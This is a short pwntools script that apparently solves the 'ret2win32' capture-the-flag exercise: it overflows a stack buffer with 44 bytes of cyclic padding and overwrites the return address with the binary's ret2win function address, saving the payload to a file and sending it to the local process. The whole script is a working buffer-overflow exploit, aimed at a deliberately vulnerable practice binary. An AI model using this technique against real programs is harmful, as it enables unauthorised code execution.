from pwn import *
context.update(arch='i386', os='linux')

binary = 'ret2win32'
elf = ELF(binary)

win = elf.functions['ret2win'].address


with open('solve.txt', 'w') as f:
    f.write(cyclic(44))
    f.write(p32(win))

p = process('./ret2win32')
p.send(cyclic(44) + p32(win))
p.interactive()
